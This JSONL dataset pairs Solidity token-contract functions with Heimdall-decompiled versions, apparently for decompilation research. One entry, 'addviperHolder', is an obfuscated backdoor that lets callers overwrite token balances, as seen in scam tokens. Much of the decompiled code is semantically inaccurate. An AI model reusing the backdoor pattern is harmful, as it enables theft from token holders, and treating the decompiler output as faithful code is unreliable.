{"contract_address": "0x92E27aedE3847Bbd0E4b917Ec2Ae444d4C3A622D", "original_solidity_code": "function manualsend() external {\r\n        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\n        uint256 contractETHBalance = address(this).balance;\r\n        sendETHToFee(contractETHBalance);\r\n    }", "heimdall_decompiled_code": "function manualsend() public {\n        require(address(msg.sender) == (address(store_p)));\n        require(address(msg.sender) == (address(store_q)));\n        (bool success, bytes memory ret0) = address(store_q).transfer(address(this).balance);\n    }"}
{"contract_address": "0x921bfABc80E240B6e0780De1471110C7bE77d4E7", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        firstBlock = block.number;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_f / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x17;\n        var_e = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_l = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_l));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require(!0x3b9aca00 | (0x01 == 0x01), \"ERC20: approve to the zero address\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(address(this) - 0, \"ERC20: approve to the zero address\");\n        require(address(store_l / 0x01) - 0, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x22;\n        var_e = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_f = address(this);\n        var_i = 0x02;\n        var_f = address(store_l / 0x01);\n        address var_i = keccak256(var_f);\n        storage_map_m[var_f] = 0x3b9aca00;\n        var_a = 0x3b9aca00;\n        emit Approval(address(this), address(store_l / 0x01), 0x3b9aca00);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).factory(var_b); // staticcall\n        uint256 var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_k = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_l / 0x01).WETH(var_d); // staticcall\n        var_c = var_c + (uint248(ret0.length + 0x1f));\n        require(!((var_c + ret0.length) - var_c) < 0x20);\n        require(var_j == (address(var_j)));\n        var_l = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        address var_h = address(var_j);\n        (bool success, bytes memory ret0) = address(var_j).Unresolved_c9c65396(var_e); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x24;\n        var_e = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                            var_g = 0x11;\n                            if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                if (!0x09 > 0x01) {\n                                    if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_g = 0x11;\n                                        if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                            var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                            var_g = 0x11;\n                                            if (!0x01) {\n                                            }\n                                            if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function updateMaxTxnAmount(uint256 newNum) external onlyOwner {\\r\\n        require(newNum >= (totalSupply() * 5 / 1000)/1e18, \\\"Cannot set maxTransactionAmount lower than 0.5%\\\");\\r\\n        maxTransactionAmount = newNum * (10**18);\\r\\n    }", "heimdall_decompiled_code": "function updateMaxTxnAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x05) / 0x05)) | !0x05);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x20ad88B64104B4E9B3915aAB9c3bfb4E4121622f", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_n[var_a] > (arg1 + storage_map_n[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((arg1 + storage_map_n[var_a]) < storage_map_n[var_a]), \"SafeMath: addition overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x1b;\n        var_g = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_n[var_a] = arg1 + storage_map_n[var_a];\n        uint256 var_d = arg1 + storage_map_n[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_n[var_a]);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function updateLiqWallet(address newLiqWallet) external onlyOwner {\r\n        emit liqWalletUpdated(newLiqWallet, liqWallet);\r\n        liqWallet = newLiqWallet;\r\n    }", "heimdall_decompiled_code": "function updateLiqWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit liqWalletUpdated(address(arg0), address(buyDevFeef));\n        buyDevFeef = (address(arg0)) | (uint96(buyDevFeef));\n    }"}
{"contract_address": "0x159B1C899Ee968Db9E5e9c5adCD184a7B6052611", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x8EF34AD921FF8e7D465210EbBe3029fB7B2dd294", "original_solidity_code": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }", "heimdall_decompiled_code": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }"}
{"contract_address": "0x85188f89Ef6A5714818DefC0607727c9BE9f8949", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x02;\n        require(!(storage_map_h[var_a] > store_i), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x2a;\n        var_g = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_h = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_e = 0x40 + var_e;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x038d7ea4c68000 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        uint256 var_h = var_e.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x038d7ea4c68000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x038d7ea4c68000);\n        }\n    }"}
{"contract_address": "0x86612Df86F83dfD8E95d71E7766E1579Bf82BCab", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x921bfABc80E240B6e0780De1471110C7bE77d4E7", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0xF6FF7F8635a951ecF4D68264b32FB3a4b5f9cf15", "original_solidity_code": "function updateMarketingWallet(address newMarketingWallet) external onlyOwner {\\r\\n        emit marketingWalletUpdated(newMarketingWallet, marketingWallet);\\r\\n        marketingWallet = newMarketingWallet;\\r\\n    }", "heimdall_decompiled_code": "function updateMarketingWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit marketingWalletUpdated(address(arg0), address(marketingWallet));\n        marketingWallet = (address(arg0)) | (uint96(marketingWallet));\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function updateoperationsWallet(address newWallet) external onlyOwner{\r\n        emit operationsWalletUpdated(newWallet, operationsWallet);\r\n        operationsWallet = newWallet;\r\n    }", "heimdall_decompiled_code": "function updateoperationsWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit operationsWalletUpdated(address(arg0), address(operationsWallet));\n        operationsWallet = (address(arg0)) | (uint96(operationsWallet));\n    }"}
{"contract_address": "0x1727A45a3E3bE7AdF4B185D80F0b4F557b755f87", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF4DEF1F694801EaBF6f4B4b8b0209E617Bb224e8", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF3B054a111b9fd6fc5289F473e456531ee89Ba1c", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x2196c73Bee850827528bf2e164c33441834dFe03", "original_solidity_code": "function changeTokenURIFlag(uint256 flag) external onlyOwner {\r\n        _flag = flag;\r\n    }", "heimdall_decompiled_code": "function changeTokenURIFlag(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_d = arg0;\n    }"}
{"contract_address": "0xBaed5dd35dec85d45f03994Aa5cA3B3E61831637", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if (!0x3b9aca00 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = (0 * 0x01) | (uint248(transferDelayEnabled));\n                        if (0x09) {\n                            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xDE1802eE6Ff990c121b748107Ab34f17b9Bc7978", "original_solidity_code": "function isExcludedFromFee(address account) public view returns (bool) {\r\n        return _isExcludedFromFee[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFee(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x03;\n        address var_c = !(!bytes1(storage_map_a[var_a]));\n        return !(!bytes1(storage_map_a[var_a]));\n    }"}
{"contract_address": "0x3e628c6678825195453B33f713147B8fb641248b", "original_solidity_code": "function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\r\n        require(newNum >= (totalSupply() * 3 / 1000)/1e18, \"Cannot set max wallet amount lower than 0.3%\");\r\n        maxWalletAmount = newNum * (10**18);\r\n        emit UpdatedMaxWalletAmount(maxWalletAmount);\r\n    }", "heimdall_decompiled_code": "function updateMaxWalletAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x03) / 0x03)) | !0x03);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x2cAA87192a72dA386D615C986479a7E600EFc46f", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x8A9Fc31209981A2BC667f39654Fa6BE6ce8611d7", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x03;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0cF6AF04E435c22D26884FAd0682E96BA150CBBb", "original_solidity_code": "function setCandy(address account) public onlyOwner {\\r\\n        candy[account] = true;\\r\\n    }", "heimdall_decompiled_code": "function setCandy(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_f = address(arg0);\n        var_g = 0x97;\n        storage_map_i[var_f] = (0x01 * 0x01) | (uint248(storage_map_i[var_f]));\n    }"}
{"contract_address": "0x718128a4433a5053A43810C1cc51427C89046b7E", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_h = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        uint256 var_c = storage_map_b[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xC246C2C0B1DEBBFF9370a5A2f0BD35c17DE5b373", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0) - 0, \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x26;\n        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] + arg1;\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
